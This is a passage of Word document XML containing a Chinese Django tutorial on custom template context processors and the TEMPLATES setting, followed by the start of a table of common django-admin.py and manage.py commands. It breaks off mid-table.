        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    return {'lang': settings.LANGUAGE_CODE}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50262487" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>该文件的方法需要request参数，最后需要返回一个字典即可。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62543086" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>再打开settings.py文件，在Templates中添加刚才写的方法引用：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52D66A95" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>TEMPLATES = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06C3B12C"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1C708CB3" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>        'BACKEND': 'django.template.backends.django.DjangoTemplates',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24D26CD8" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>        'DIRS': [],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37A66EB0" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>        'APP_DIRS': True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06F13613" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>        'OPTIONS': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EB42C19" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>            'context_processors': [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="110CB9F0" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>                'django.template.context_processors.debug',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3045F398" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>                'django.template.context_processors.request',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="069EEC08" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>                'django.contrib.auth.context_processors.auth',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19D1B245" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>                'django.contrib.messages.context_processors.messages',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CB0BFDC"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43BD16A4" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>                # 自定义模版全局变量(默认变量)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="481A6280" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>                'myproject.contexts.lang',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3741A8EF"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6CFAA9E5"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6754A48F" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AE7C112" w14:textId="6A14BA72" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60F4539D" w14:textId="55899B08" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>添加模版全局变量之后，我们可以在任意位置渲染模版页面无需再手动写相关代码即可使用该变量。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DE868BB" w14:textId="1C402757" w:rsidR="001C47AF" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">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099</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId340" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="00016AA9">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:b/>
            <w:color w:val="4D4D4D"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="27"/>
            <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
          </w:rPr>
          <w:t>Django常用命令django-admin.py和manage.py用法详解</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7E296277" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django常用命令django-admin.py和manage.py用法详解</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14B37787" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>原创 大江狗 </w:t>
      </w:r>
      <w:hyperlink r:id="rId341" w:history="1">
        <w:r w:rsidRPr="00016AA9">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2018-06-17</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64848A16" w14:textId="3D524681" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>学习Django你需要了解常见命令的使用，比如创建项目，创建应用，创建超级用户，数据表创建及更新，启动服务器等。这些命令都包含在django-admin.py和manage.py里。除此以外manage.py还包含其它有用的命令，我们今天就来看一看。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BB2608F" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>django-admin.py和manage.py常用命令</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="152F1D60" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>这两个文件代码和包含命令基本是一样的，只不过django-admin.py一般只用来创建项目，而manage.py用来管理创建好了的项目。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09B56DAD" w14:textId="10CA5D99" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django常用命令如下:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="10152" w:type="dxa"/>
        <w:jc w:val="center"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4082"/>
        <w:gridCol w:w="6070"/>
      </w:tblGrid>
      <w:tr w:rsidR="00016AA9" w14:paraId="2101CF05" w14:textId="77777777" w:rsidTr="00016AA9">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="283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03D465D" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode5"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="3DAAD6"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>任务</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9C12053" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode6"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="3DAAD6"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>命令</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00016AA9" w14:paraId="149AAC3B" w14:textId="77777777" w:rsidTr="00016AA9">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="283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D6FB580" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>创建新项目</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192E2AB" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>django-admin.py startproject project_name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B0E7491" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>(注意: windows系统下请用django-admin startproject xxx)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00016AA9" w14:paraId="265815F3" w14:textId="77777777" w:rsidTr="00016AA9">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="283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CCE06D6" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>创建新应用</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386DE5A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>python manage.py startapp app_name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56E90A72" w14:textId="72FD893D" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="454294ED" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>(注意: 你需要先cd进入创建的项目文件夹)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00016AA9" w14:paraId="7568F898" w14:textId="77777777" w:rsidTr="00016AA9">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="283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C4EDA8E" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>检测模型变化，生成新的数据库迁移文件</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82333CF" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>python manage.py makemigrations [app_label]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="198744D9" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>(注意: app名字可选。如果一个项目包含多个app，而你只更改了其中一个app的模型，建议后面加入具体的app名)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00016AA9" w14:paraId="2FDDB224" w14:textId="77777777" w:rsidTr="00016AA9">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="283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715CF29" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>同步数据库与模型</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AB9401E" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>python manage.py migrate</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00016AA9" w14:paraId="5F36E7CF" w14:textId="77777777" w:rsidTr="00016AA9">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="283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707D0A3" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>启动服务器</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1DBFAF2" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>python manage.py runserver</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00016AA9" w14:paraId="68087CE0" w14:textId="77777777" w:rsidTr="00016AA9">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="70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867DE7E" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>创建超级用户</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3CF7000" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>python manage.py createsuperuser</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00016AA9" w14:paraId="7FAAB1B8" w14:textId="77777777" w:rsidTr="00016AA9">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="70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28AB8527" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>修改用户密码</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71FF299" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>python manage.py changepassword username</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00016AA9" w14:paraId="02A1CD22" w14:textId="77777777" w:rsidTr="00016AA9">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="70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270CD63" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>打开交互终端</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C843E62" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
